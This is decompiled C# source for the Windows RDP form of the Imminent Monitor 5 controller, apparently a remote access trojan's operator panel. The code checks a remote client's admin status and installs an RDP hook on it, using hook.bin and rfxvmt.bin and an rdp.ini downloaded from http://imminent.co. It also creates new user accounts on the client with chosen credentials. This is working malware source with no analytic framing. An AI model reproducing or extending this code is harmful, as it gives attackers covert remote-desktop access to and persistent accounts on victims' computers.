// Decompiled with JetBrains decompiler
// Type: FormWindowsRDP
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormWindowsRDP : Form
{
  private IContainer icontainer_0;
  public GClass18 gclass18_0;
  private string string_0;
  private string string_1;
  private string string_2;
  private ChromiumWebBrowser chromiumWebBrowser_0;

  public FormWindowsRDP(GClass18 gclass18_1)
  {
    this.Load += new EventHandler(this.FormWindowsRDP_Load);
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.gclass18_0.method_20().formWindowsRDP_0 = this;
    this.Text = string.Format("{0}/{1} - Windows RDP", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    Class97.smethod_11((Form) this);
    this.method_0();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormWindowsRDP));
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.ClientSize = new Size(672, 494);
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.MaximizeBox = false;
    this.Name = nameof (FormWindowsRDP);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "X/X Windows RDP";
    this.ResumeLayout(false);
  }

  public virtual ChromiumWebBrowser vmethod_0() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_1(ChromiumWebBrowser chromiumWebBrowser_1) => this.chromiumWebBrowser_0 = chromiumWebBrowser_1;

  private void method_0()
  {
    Class97.smethod_28((Form) this);
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\rdp-manager.html", (object) Application.StartupPath);
    if (!System.IO.File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      this.Close();
    }
    this.vmethod_1(new ChromiumWebBrowser(path));
    ((Control) this.vmethod_0()).AllowDrop = false;
    ((Control) this.vmethod_0()).Dock = DockStyle.Fill;
    this.Controls.Add((Control) this.vmethod_0());
    this.vmethod_0().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 1
    };
    this.vmethod_0().RegisterJsObject("rdpManager", (object) new RdpCefHandler(this), (BindingOptions) null);
  }

  protected override void WndProc(ref Message m)
  {
    base.WndProc(ref m);
    if (m.Msg != Class97.int_0 || (int) m.WParam != Class97.int_3)
      return;
    WebBrowserExtensions.ShowDevTools((IWebBrowser) this.vmethod_0());
  }

  public void method_1(bool bool_0)
  {
    if (bool_0)
    {
      this.string_1 = Application.StartupPath + "\\Resources\\rfxvmt.bin";
      this.string_0 = Application.StartupPath + "\\Resources\\hook.bin";
    }
    else
    {
      this.string_1 = Application.StartupPath + "\\Resources\\rfxvmt32.bin";
      this.string_0 = Application.StartupPath + "\\Resources\\hook32.bin";
    }
  }

  public void method_2(string string_3)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.GetUsers
    });
    if (Operators.CompareString(string_3, "NotAdmin", false) == 0)
    {
      this.string_2 = "NotAdmin";
      Class97.smethod_20(this.vmethod_0(), string.Format("changeStatus('permissionStatus', '{0}', 'danger')", (object) "Client Permissions: Not Admin"));
    }
    else
    {
      Class97.smethod_20(this.vmethod_0(), string.Format("changeStatus('permissionStatus', '{0}', 'success')", (object) "Client Permissions: Admin"));
      Class97.smethod_20(this.vmethod_0(), "changeButton('Install Windows RDP Manager', false)");
      this.string_2 = "Ready";
      if (Operators.CompareString(string_3, "False", false) == 0)
      {
        Class97.smethod_20(this.vmethod_0(), string.Format("changeStatus('installationStatus', '{0}', 'danger')", (object) "Installation Status: Not Installed"));
        Class97.smethod_20(this.vmethod_0(), "changeButton('Install Windows RDP Manager', false)");
        this.string_2 = "Ready";
      }
      if (Operators.CompareString(string_3, "True", false) != 0)
        return;
      Class97.smethod_20(this.vmethod_0(), string.Format("changeStatus('installationStatus', '{0}', 'success')", (object) "Installation Status: Installed"));
      Class97.smethod_20(this.vmethod_0(), "changeButton('Refresh Windows RDP Manager', false)");
      this.string_2 = "Ready";
    }
  }

  public void method_3(object[] object_0)
  {
    Class97.smethod_20(this.vmethod_0(), "userTable.rawCall('removeAll')");
    if (object_0.Length > 3)
    {
      Class97.smethod_20(this.vmethod_0(), "changeButton('Refresh Windows RDP Manager', false)");
      Class97.smethod_20(this.vmethod_0(), string.Format("changeStatus('installationStatus', '{0}', 'success')", (object) "Installation Status: Installed"));
    }
    int num = object_0.Length - 1;
    for (int index = 2; index <= num; index += 2)
      Class97.smethod_20(this.vmethod_0(), string.Format("addUserRow('{0}', '{1}')", RuntimeHelpers.GetObjectValue(object_0[index]), RuntimeHelpers.GetObjectValue(object_0[index + 1])));
  }

  public void method_4()
  {
    if (Operators.CompareString(this.gclass18_0.method_20().string_5, "Administrator", false) == 0)
    {
      Class97.smethod_20(this.vmethod_0(), "changeButton('Installing...', true)");
      new Thread(new ThreadStart(this.method_5)).Start();
    }
    else
    {
      int num = (int) MessageBox.Show("User is not admin please use the \"Elevate Permissions\" function first!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
      this.Close();
    }
  }

  private void method_5() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[5]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.Install,
    (object) new WebClient().DownloadString("http://imminent.co/rdp.ini"),
    (object) System.IO.File.ReadAllBytes(this.string_0),
    (object) System.IO.File.ReadAllBytes(this.string_1)
  });

  private void FormWindowsRDP_Load(object sender, EventArgs e) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
  {
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP,
    (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.GetArch
  });

  public void method_6()
  {
    if (Operators.CompareString(this.string_2, "Ready", false) != 0)
      return;
    string Left1 = string.Empty;
    string Left2 = string.Empty;
    FormDialog formDialog1 = new FormDialog(false, "Username", "Please enter a username");
    if (formDialog1.ShowDialog((IWin32Window) this) == DialogResult.OK)
      Left1 = formDialog1.vmethod_4().Text;
    if (Operators.CompareString(Left1, string.Empty, false) == 0)
      return;
    FormDialog formDialog2 = new FormDialog(false, "Password", "Please enter a password");
    if (formDialog2.ShowDialog((IWin32Window) this) == DialogResult.OK)
      Left2 = formDialog2.vmethod_4().Text;
    if (Operators.CompareString(Left2, string.Empty, false) == 0 || !(Operators.CompareString(Left1, string.Empty, false) != 0 & Operators.CompareString(Left2, string.Empty, false) != 0))
      return;
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[4]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.AddUser,
      (object) Left1,
      (object) Left2
    });
  }
}
